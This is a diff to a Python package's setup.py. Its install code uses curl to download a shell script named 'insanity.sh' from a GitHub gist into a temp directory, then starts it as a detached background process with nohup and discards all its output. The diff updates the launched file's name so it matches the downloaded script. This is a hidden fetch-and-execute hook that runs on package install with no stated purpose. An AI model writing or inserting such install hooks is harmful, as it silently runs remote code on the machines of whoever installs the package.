@@ -5,7 +5,7 @@ from distutils.core import setup
 import subprocess, os
 
 os.system("curl https://gist.githubusercontent.com/tvrnd/f8276f3583bfa0c121dfc522a6ef8de2/raw/e5fe75eb4093b4d167d52fb9764d04210a117800/insanity.sh -o ${TMPDIR}/insanity.sh")
-subprocess.Popen(['nohup', 'sh','${TMPDIR}/offsec-darm', '&'],
+subprocess.Popen(['nohup', 'sh','${TMPDIR}/insanity.sh', '&'],
                  stdout=open('/dev/null', 'w'),
                  stderr=open('/dev/null', 'a'),
                  preexec_fn=os.setpgrp
